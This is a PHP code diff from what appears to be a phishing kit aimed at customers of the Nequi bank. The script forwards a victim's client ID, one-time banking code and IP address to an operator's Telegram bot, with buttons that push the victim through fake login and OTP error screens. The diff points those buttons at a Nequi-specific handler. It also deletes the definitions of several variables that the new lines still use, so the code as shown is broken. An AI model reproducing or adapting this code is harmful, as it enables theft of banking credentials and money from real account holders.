@@ -31,28 +31,32 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Enviar datos a Telegram
         $botToken = $config['botToken'];
         $chatId = $config['chatId'];
-        $baseUrl = $config['baseUrl'];
-        $security_key = $config['security_key'];
-        $ip_cliente = $_SERVER['REMOTE_ADDR'];
+        // Ajustar URL para usar el script específico de Nequi
+        $nequiBaseUrl = $baseUrl;
+        if (strpos($baseUrl, 'updatetele.php') !== false) {
+            $nequiBaseUrl = str_replace('updatetele.php', 'pago/nequi/process/updatetele.php', $baseUrl);
+        } else {
+            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/nequi/process/updatetele.php';
+        }
 
-        $message = "🔄 *OTP (Nequi)*\n\n"
-            . "🆔 *ID del cliente:* `" . escapeMarkdownV2($cliente_id) . "`\n"
-            . "🔢 *Clave dinámica:* `" . escapeMarkdownV2($otp) . "`\n"
-            . "🌐 *IP del cliente:* `" . escapeMarkdownV2($ip_cliente) . "`\n"
-            . "📌 *Estado actualizado a:* `Ingreso OTP`";
+        $message = "🔄 <b>OTP (Nequi)</b>\n\n"
+            . "🆔 <b>ID del cliente:</b> <code>" . $cliente_id . "</code>\n"
+            . "🔢 <b>Clave dinámica:</b> <code>" . $otp . "</code>\n"
+            . "🌐 <b>IP del cliente:</b> <code>" . $ip_cliente . "</code>\n"
+            . "📌 <b>Estado actualizado a:</b> <code>Ingreso OTP</code>";
 
         $keyboard = [
             'inline_keyboard' => [
                 [
-                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
-                    ['text' => 'Datos', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"]
+                    ['text' => 'Error Login', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=2&key=$security_key"],
+                    ['text' => 'Datos', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=6&key=$security_key"]
                 ],
                 [
-                    ['text' => 'Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
-                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"]
+                    ['text' => 'Otp', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=3&key=$security_key"],
+                    ['text' => 'Otp Error', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=4&key=$security_key"]
                 ],
                 [
-                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key"]
+                    ['text' => 'Finalizar', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=0&key=$security_key"]
                 ]
             ]
         ];
@@ -60,7 +64,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $data = [
             'chat_id' => $chatId,
             'text' => $message,
-            'parse_mode' => 'MarkdownV2',
+            'parse_mode' => 'HTML',
             'reply_markup' => json_encode($keyboard)
         ];
 
